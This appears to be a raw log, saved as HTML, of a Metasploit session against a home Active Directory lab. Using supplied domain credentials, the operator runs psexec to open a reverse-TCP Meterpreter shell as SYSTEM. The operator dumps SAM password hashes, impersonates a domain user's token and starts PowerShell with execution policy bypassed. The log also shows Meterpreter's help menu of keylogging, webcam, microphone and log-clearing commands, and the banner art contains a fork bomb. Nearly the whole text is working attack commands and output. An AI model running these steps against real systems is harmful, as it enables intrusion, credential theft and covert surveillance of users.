@@ -1,0 +1,502 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>msf console output</title>
+</head><body>──(root㉿kali)-[~]<br/>
+└─# msfconsole<br/>
+                         <br/>
+                       `:oDFo:`              <br/>
+                     ./ymM0dayMmy/.             <br/>
+                    -+dHJ5aGFyZGVyIQ==+-          <br/>
+                  `:sm⏣~~Destroy.No.Data~~s:`        <br/>
+                -+h2~~Maintain.No.Persistence~~h+-       <br/>
+              `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`     <br/>
+             ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.   <br/>
+           -++SecKCoin++e.AMd`    `.-://///+hbove.913.ElsMNh+-  <br/>
+           -~/.ssh/id_rsa.Des-         `htN01UserWroteMe!- <br/>
+           :dopeAW.No&lt;nano&gt;o           :is:TЯiKC.sudo-.A: <br/>
+           :we're.all.alike'`           The.PFYroy.No.D7: <br/>
+           :PLACEDRINKHERE!:           yxp_cmdshell.Ab0:  <br/>
+           :msf&gt;exploit -j.            :Ns.BOB&amp;ALICEes7:  <br/>
+           :---srwxrwx:-.`            `MS146.52.No.Per:  <br/>
+           :&lt;script&gt;.Ac816/            sENbove3101.404:  <br/>
+           :NT_AUTHORITY.Do            `T:/shSYSTEM-.N:  <br/>
+           :09.14.2011.raid            /STFU|wall.No.Pr:  <br/>
+           :hevnsntSurb025N.           dNVRGOING2GIVUUP:  <br/>
+           :#OUTHOUSE- -s:            /corykennedyData:  <br/>
+           :$nmap -oS               SSo.6178306Ence:  <br/>
+           :Awsm.da:              /shMTl#beats3o.No.:  <br/>
+           :Ring0:               `dDestRoyREXKC3ta/M:  <br/>
+           :23d:                sSETEC.ASTRONOMYist:  <br/>
+           /-            /yo-  .ence.N:(){ :|: &amp; };:  <br/>
+                        `:Shall.We.Play.A.Game?tron/  <br/>
+                        ```-ooy.if1ghtf0r+ehUser5`  <br/>
+                       ..th3.H1V3.U2VjRFNN.jMh+.`     <br/>
+                       `MjM~~WE.ARE.se~~MMjMs                                       <br/>
+                       +~KANSAS.CITY's~-`                                        <br/>
+                        J~HAKCERS~./.`                                          <br/>
+                        .esc:wq!:`                                            <br/>
+                        +++ATH`                                             <br/>
+                         `                                               <br/>
+                                                                        <br/>
+<br/>
+   =[ metasploit v6.2.3-dev              ]<br/>
++ -- --=[ 2227 exploits - 1172 auxiliary - 398 post    ]<br/>
++ -- --=[ 864 payloads - 45 encoders - 11 nops      ]<br/>
++ -- --=[ 9 evasion                    ]<br/>
+<br/>
+Metasploit tip: Start commands with a space to avoid saving <br/>
+them to history<br/>
+<br/>
+msf6 &gt; use exploit/windows/smb/psexec <br/>
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                           <br/>
+msf6 exploit(windows/smb/psexec) &gt; options                                                          <br/>
+                                                                              <br/>
+Module options (exploit/windows/smb/psexec):                                                                         <br/>
+                                                                                              <br/>
+ Name         Current Setting Required Description                                                               <br/>
+ ----         --------------- -------- -----------                                                               <br/>
+ RHOSTS                 yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit                       <br/>
+ RPORT         445       yes    The SMB service port (TCP)                                                        <br/>
+ SERVICE_DESCRIPTION          no    Service description to to be used on target for pretty listing                                      <br/>
+ SERVICE_DISPLAY_NAME          no    The service display name                                                                   <br/>
+ SERVICE_NAME              no    The service name                                                                       <br/>
+ SMBDomain       .        no    The Windows domain to use for authentication                                                                      <br/>
+ SMBPass                no    The password for the specified username                                                                         <br/>
+ SMBSHARE                no    The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share                                           <br/>
+ SMBUser                no    The username to authenticate as                                                                             <br/>
+                                                                                                                      <br/>
+                                                                                                                      <br/>
+Payload options (windows/meterpreter/reverse_tcp):                                                                                             <br/>
+                                                                                                                      <br/>
+ Name   Current Setting Required Description<br/>
+ ----   --------------- -------- -----------<br/>
+ EXITFUNC thread      yes    Exit technique (Accepted: '', seh, thread, process, none)<br/>
+ LHOST   192.168.17.128  yes    The listen address (an interface may be specified)<br/>
+ LPORT   4444       yes    The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 0  Automatic<br/>
+<br/>
+<br/>
+msf6 exploit(windows/smb/psexec) &gt; set rhosts 192.168.205.138<br/>
+rhosts =&gt; 192.168.205.138<br/>
+msf6 exploit(windows/smb/psexec) &gt; set smbdomain marvel.local<br/>
+smbdomain =&gt; marvel.local<br/>
+msf6 exploit(windows/smb/psexec) &gt; set smbpass Password1<br/>
+smbpass =&gt; Password1<br/>
+msf6 exploit(windows/smb/psexec) &gt; set smbuser fcastle<br/>
+smbuser =&gt; fcastle<br/>
+msf6 exploit(windows/smb/psexec) &gt; show targets<br/>
+<br/>
+Exploit targets:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 0  Automatic<br/>
+ 1  PowerShell<br/>
+ 2  Native upload<br/>
+ 3  MOF upload<br/>
+ 4  Command<br/>
+<br/>
+<br/>
+msf6 exploit(windows/smb/psexec) &gt; set target 2<br/>
+target =&gt; 2<br/>
+msf6 exploit(windows/smb/psexec) &gt; options<br/>
+<br/>
+Module options (exploit/windows/smb/psexec):<br/>
+<br/>
+ Name         Current Setting Required Description<br/>
+ ----         --------------- -------- -----------<br/>
+ RHOSTS        192.168.205.138 yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br/>
+ RPORT         445       yes    The SMB service port (TCP)<br/>
+ SERVICE_DESCRIPTION          no    Service description to to be used on target for pretty listing<br/>
+ SERVICE_DISPLAY_NAME          no    The service display name<br/>
+ SERVICE_NAME              no    The service name<br/>
+ SMBDomain       marvel.local   no    The Windows domain to use for authentication<br/>
+ SMBPass        Password1    no    The password for the specified username<br/>
+ SMBSHARE                no    The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share<br/>
+ SMBUser        fcastle     no    The username to authenticate as<br/>
+<br/>
+<br/>
+Payload options (windows/meterpreter/reverse_tcp):<br/>
+<br/>
+ Name   Current Setting Required Description<br/>
+ ----   --------------- -------- -----------<br/>
+ EXITFUNC thread      yes    Exit technique (Accepted: '', seh, thread, process, none)<br/>
+ LHOST   192.168.17.128  yes    The listen address (an interface may be specified)<br/>
+ LPORT   4444       yes    The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 2  Native upload<br/>
+<br/>
+<br/>
+msf6 exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/reverse_tcp<br/>
+payload =&gt; windows/x64/meterpreter/reverse_tcp<br/>
+msf6 exploit(windows/smb/psexec) &gt; set lhost eth0<br/>
+lhost =&gt; eth0<br/>
+msf6 exploit(windows/smb/psexec) &gt; options<br/>
+<br/>
+Module options (exploit/windows/smb/psexec):<br/>
+<br/>
+ Name         Current Setting Required Description<br/>
+ ----         --------------- -------- -----------<br/>
+ RHOSTS        192.168.205.138 yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br/>
+ RPORT         445       yes    The SMB service port (TCP)<br/>
+ SERVICE_DESCRIPTION          no    Service description to to be used on target for pretty listing<br/>
+ SERVICE_DISPLAY_NAME          no    The service display name<br/>
+ SERVICE_NAME              no    The service name<br/>
+ SMBDomain       marvel.local   no    The Windows domain to use for authentication<br/>
+ SMBPass        Password1    no    The password for the specified username<br/>
+ SMBSHARE                no    The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share<br/>
+ SMBUser        fcastle     no    The username to authenticate as<br/>
+<br/>
+<br/>
+Payload options (windows/x64/meterpreter/reverse_tcp):<br/>
+<br/>
+ Name   Current Setting Required Description<br/>
+ ----   --------------- -------- -----------<br/>
+ EXITFUNC thread      yes    Exit technique (Accepted: '', seh, thread, process, none)<br/>
+ LHOST   eth0       yes    The listen address (an interface may be specified)<br/>
+ LPORT   4444       yes    The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 2  Native upload<br/>
+<br/>
+<br/>
+msf6 exploit(windows/smb/psexec) &gt; run<br/>
+<br/>
+[*] Started reverse TCP handler on 192.168.17.128:4444 <br/>
+[*] 192.168.205.138:445 - Connecting to the server...<br/>
+[-] 192.168.205.138:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (192.168.205.138:445) timed out.<br/>
+[*] Exploit completed, but no session was created.<br/>
+msf6 exploit(windows/smb/psexec) &gt; set rhosts 192.168.17.130<br/>
+rhosts =&gt; 192.168.17.130<br/>
+msf6 exploit(windows/smb/psexec) &gt; run<br/>
+<br/>
+[*] Started reverse TCP handler on 192.168.17.128:4444 <br/>
+[*] 192.168.17.130:445 - Connecting to the server...<br/>
+[*] 192.168.17.130:445 - Authenticating to 192.168.17.130:445|marvel.local as user 'fcastle'...<br/>
+[!] 192.168.17.130:445 - peer_native_os is only available with SMB1 (current version: SMB3)<br/>
+[*] 192.168.17.130:445 - Uploading payload... tkIkOLAZ.exe<br/>
+[*] 192.168.17.130:445 - Created \tkIkOLAZ.exe...<br/>
+[+] 192.168.17.130:445 - Service started successfully...<br/>
+[*] 192.168.17.130:445 - Deleting \tkIkOLAZ.exe...<br/>
+[*] Sending stage (200774 bytes) to 192.168.17.130<br/>
+[*] Meterpreter session 1 opened (192.168.17.128:4444 -&gt; 192.168.17.130:49888) at 2023-07-19 13:33:27 +0530<br/>
+<br/>
+meterpreter &gt; hashdump<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8777e8ec862d790785ca8a67296ec2e7:::<br/>
+meterpreter &gt; getuid<br/>
+Server username: NT AUTHORITY\SYSTEM<br/>
+meterpreter &gt; sysinfo<br/>
+Computer    : THEPUNISHER<br/>
+OS       : Windows 10 (10.0 Build 19045).<br/>
+Architecture  : x64<br/>
+System Language : en_US<br/>
+Domain     : MARVEL<br/>
+Logged On Users : 7<br/>
+Meterpreter   : x64/windows<br/>
+meterpreter &gt; load <br/>
+load espia    load extapi   load incognito  load kiwi    load lanattacks load peinjector load powershell load priv    load python   load sniffer   load stdapi   load unhook   load winpmem<br/>
+meterpreter &gt; load <br/>
+load espia    load extapi   load incognito  load kiwi    load lanattacks load peinjector load powershell load priv    load python   load sniffer   load stdapi   load unhook   load winpmem<br/>
+meterpreter &gt; shell<br/>
+Process 2972 created.<br/>
+Channel 1 created.<br/>
+Microsoft Windows [Version 10.0.19045.2006]<br/>
+(c) Microsoft Corporation. All rights reserved.<br/>
+<br/>
+C:\Windows\system32&gt;powershell -ep bypass<br/>
+powershell -ep bypass<br/>
+Windows PowerShell<br/>
+Copyright (C) Microsoft Corporation. All rights reserved.<br/>
+<br/>
+Try the new cross-platform PowerShell https://aka.ms/pscore6<br/>
+<br/>
+PS C:\Windows\system32&gt; ^C<br/>
+Terminate channel 1? [y/N] y<br/>
+meterpreter &gt; load incognito <br/>
+Loading extension incognito...Success.<br/>
+meterpreter &gt; help<br/>
+<br/>
+Core Commands<br/>
+=============<br/>
+<br/>
+  Command          Description<br/>
+  -------          -----------<br/>
+  ?             Help menu<br/>
+  background        Backgrounds the current session<br/>
+  bg            Alias for background<br/>
+  bgkill          Kills a background meterpreter script<br/>
+  bglist          Lists running background scripts<br/>
+  bgrun           Executes a meterpreter script as a background thread<br/>
+  channel          Displays information or control active channels<br/>
+  close           Closes a channel<br/>
+  detach          Detach the meterpreter session (for http/https)<br/>
+  disable_unicode_encoding Disables encoding of unicode strings<br/>
+  enable_unicode_encoding  Enables encoding of unicode strings<br/>
+  exit           Terminate the meterpreter session<br/>
+  get_timeouts       Get the current session timeout values<br/>
+  guid           Get the session GUID<br/>
+  help           Help menu<br/>
+  info           Displays information about a Post module<br/>
+  irb            Open an interactive Ruby shell on the current session<br/>
+  load           Load one or more meterpreter extensions<br/>
+  machine_id        Get the MSF ID of the machine attached to the session<br/>
+  migrate          Migrate the server to another process<br/>
+  pivot           Manage pivot listeners<br/>
+  pry            Open the Pry debugger on the current session<br/>
+  quit           Terminate the meterpreter session<br/>
+  read           Reads data from a channel<br/>
+  resource         Run the commands stored in a file<br/>
+  run            Executes a meterpreter script or Post module<br/>
+  secure          (Re)Negotiate TLV packet encryption on the session<br/>
+  sessions         Quickly switch to another session<br/>
+  set_timeouts       Set the current session timeout values<br/>
+  sleep           Force Meterpreter to go quiet, then re-establish session<br/>
+  ssl_verify        Modify the SSL certificate verification setting<br/>
+  transport         Manage the transport mechanisms<br/>
+  use            Deprecated alias for &quot;load&quot;<br/>
+  uuid           Get the UUID for the current session<br/>
+  write           Writes data to a channel<br/>
+<br/>
+<br/>
+Stdapi: File system Commands<br/>
+============================<br/>
+<br/>
+  Command    Description<br/>
+  -------    -----------<br/>
+  cat      Read the contents of a file to the screen<br/>
+  cd      Change directory<br/>
+  checksum   Retrieve the checksum of a file<br/>
+  cp      Copy source to destination<br/>
+  del      Delete the specified file<br/>
+  dir      List files (alias for ls)<br/>
+  download   Download a file or directory<br/>
+  edit     Edit a file<br/>
+  getlwd    Print local working directory<br/>
+  getwd     Print working directory<br/>
+  lcat     Read the contents of a local file to the screen<br/>
+  lcd      Change local working directory<br/>
+  lls      List local files<br/>
+  lpwd     Print local working directory<br/>
+  ls      List files<br/>
+  mkdir     Make directory<br/>
+  mv      Move source to destination<br/>
+  pwd      Print working directory<br/>
+  rm      Delete the specified file<br/>
+  rmdir     Remove directory<br/>
+  search    Search for files<br/>
+  show_mount  List all mount points/logical drives<br/>
+  upload    Upload a file or directory<br/>
+<br/>
+<br/>
+Stdapi: Networking Commands<br/>
+===========================<br/>
+<br/>
+  Command    Description<br/>
+  -------    -----------<br/>
+  arp      Display the host ARP cache<br/>
+  getproxy   Display the current proxy configuration<br/>
+  ifconfig   Display interfaces<br/>
+  ipconfig   Display interfaces<br/>
+  netstat    Display the network connections<br/>
+  portfwd    Forward a local port to a remote service<br/>
+  resolve    Resolve a set of host names on the target<br/>
+  route     View and modify the routing table<br/>
+<br/>
+<br/>
+Stdapi: System Commands<br/>
+=======================<br/>
+<br/>
+  Command    Description<br/>
+  -------    -----------<br/>
+  clearev    Clear the event log<br/>
+  drop_token  Relinquishes any active impersonation token.<br/>
+  execute    Execute a command<br/>
+  getenv    Get one or more environment variable values<br/>
+  getpid    Get the current process identifier<br/>
+  getprivs   Attempt to enable all privileges available to the current process<br/>
+  getsid    Get the SID of the user that the server is running as<br/>
+  getuid    Get the user that the server is running as<br/>
+  kill     Terminate a process<br/>
+  localtime   Displays the target system local date and time<br/>
+  pgrep     Filter processes by name<br/>
+  pkill     Terminate processes by name<br/>
+  ps      List running processes<br/>
+  reboot    Reboots the remote computer<br/>
+  reg      Modify and interact with the remote registry<br/>
+  rev2self   Calls RevertToSelf() on the remote machine<br/>
+  shell     Drop into a system command shell<br/>
+  shutdown   Shuts down the remote computer<br/>
+  steal_token  Attempts to steal an impersonation token from the target process<br/>
+  suspend    Suspends or resumes a list of processes<br/>
+  sysinfo    Gets information about the remote system, such as OS<br/>
+<br/>
+<br/>
+Stdapi: User interface Commands<br/>
+===============================<br/>
+<br/>
+  Command    Description<br/>
+  -------    -----------<br/>
+  enumdesktops  List all accessible desktops and window stations<br/>
+  getdesktop   Get the current meterpreter desktop<br/>
+  idletime    Returns the number of seconds the remote user has been idle<br/>
+  keyboard_send Send keystrokes<br/>
+  keyevent    Send key events<br/>
+  keyscan_dump  Dump the keystroke buffer<br/>
+  keyscan_start Start capturing keystrokes<br/>
+  keyscan_stop  Stop capturing keystrokes<br/>
+  mouse     Send mouse events<br/>
+  screenshare  Watch the remote user desktop in real time<br/>
+  screenshot   Grab a screenshot of the interactive desktop<br/>
+  setdesktop   Change the meterpreters current desktop<br/>
+  uictl     Control some of the user interface components<br/>
+<br/>
+<br/>
+Stdapi: Webcam Commands<br/>
+=======================<br/>
+<br/>
+  Command    Description<br/>
+  -------    -----------<br/>
+  record_mic   Record audio from the default microphone for X seconds<br/>
+  webcam_chat  Start a video chat<br/>
+  webcam_list  List webcams<br/>
+  webcam_snap  Take a snapshot from the specified webcam<br/>
+  webcam_stream Play a video stream from the specified webcam<br/>
+<br/>
+<br/>
+Stdapi: Audio Output Commands<br/>
+=============================<br/>
+<br/>
+  Command    Description<br/>
+  -------    -----------<br/>
+  play     play a waveform audio file (.wav) on the target system<br/>
+<br/>
+<br/>
+Priv: Elevate Commands<br/>
+======================<br/>
+<br/>
+  Command    Description<br/>
+  -------    -----------<br/>
+  getsystem   Attempt to elevate your privilege to that of local system.<br/>
+<br/>
+<br/>
+Priv: Password database Commands<br/>
+================================<br/>
+<br/>
+  Command    Description<br/>
+  -------    -----------<br/>
+  hashdump   Dumps the contents of the SAM database<br/>
+<br/>
+<br/>
+Priv: Timestomp Commands<br/>
+========================<br/>
+<br/>
+  Command    Description<br/>
+  -------    -----------<br/>
+  timestomp   Manipulate file MACE attributes<br/>
+<br/>
+<br/>
+Incognito Commands<br/>
+==================<br/>
+<br/>
+  Command       Description<br/>
+  -------       -----------<br/>
+  add_group_user    Attempt to add a user to a global group with all tokens<br/>
+  add_localgroup_user Attempt to add a user to a local group with all tokens<br/>
+  add_user       Attempt to add a user with all tokens<br/>
+  impersonate_token  Impersonate specified token<br/>
+  list_tokens     List tokens available under current user context<br/>
+  snarf_hashes     Snarf challenge/response hashes for every token<br/>
+<br/>
+meterpreter &gt; <br/>
+rpreter &gt; Interrupt: use the 'exit' command to quit<br/>
+meterpreter &gt; list_tokens -u<br/>
+<br/>
+Delegation Tokens Available<br/>
+========================================<br/>
+Font Driver Host\UMFD-0<br/>
+Font Driver Host\UMFD-1<br/>
+MARVEL\fcastle<br/>
+NT AUTHORITY\LOCAL SERVICE<br/>
+NT AUTHORITY\NETWORK SERVICE<br/>
+NT AUTHORITY\SYSTEM<br/>
+Window Manager\DWM-1<br/>
+<br/>
+Impersonation Tokens Available<br/>
+========================================<br/>
+No tokens available<br/>
+<br/>
+meterpreter &gt; list_tokens -u<br/>
+<br/>
+Delegation Tokens Available<br/>
+========================================<br/>
+Font Driver Host\UMFD-0<br/>
+Font Driver Host\UMFD-1<br/>
+MARVEL\fcastle<br/>
+NT AUTHORITY\LOCAL SERVICE<br/>
+NT AUTHORITY\NETWORK SERVICE<br/>
+NT AUTHORITY\SYSTEM<br/>
+Window Manager\DWM-1<br/>
+<br/>
+Impersonation Tokens Available<br/>
+========================================<br/>
+No tokens available<br/>
+<br/>
+meterpreter &gt; impersonate_token MARVEL\fcastle<br/>
+[-] User token MARVELfcastle not found<br/>
+meterpreter &gt; shell<br/>
+Process 6796 created.<br/>
+Channel 2 created.<br/>
+Microsoft Windows [Version 10.0.19045.2006]<br/>
+(c) Microsoft Corporation. All rights reserved.<br/>
+<br/>
+C:\Windows\system32&gt;whoami<br/>
+whoami<br/>
+nt authority\system<br/>
+<br/>
+C:\Windows\system32&gt;^[[A^C<br/>
+Terminate channel 2? [y/N] y<br/>
+meterpreter &gt; impersonate_token marvel\\fcastle<br/>
+[+] Delegation token available<br/>
+[+] Successfully impersonated user MARVEL\fcastle<br/>
+meterpreter &gt; shell<br/>
+Process 4872 created.<br/>
+Channel 3 created.<br/>
+Microsoft Windows [Version 10.0.19045.2006]<br/>
+(c) Microsoft Corporation. All rights reserved.<br/>
+<br/>
+C:\Windows\system32&gt;whoami<br/>
+whoami<br/>
+marvel\fcastle<br/>
+<br/>
+C:\Windows\system32&gt;^C<br/>
+Terminate channel 3? [y/N] y<br/>
+meterpreter &gt; hashdump<br/>
+[-] priv_passwd_get_sam_hashes: Operation failed: Access is denied.<br/>
+meterpreter &gt; rev2self <br/>
+meterpreter &gt; hashdump<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8777e8ec862d790785ca8a67296ec2e7:::<br/>
+meterpreter &gt; </body></html>
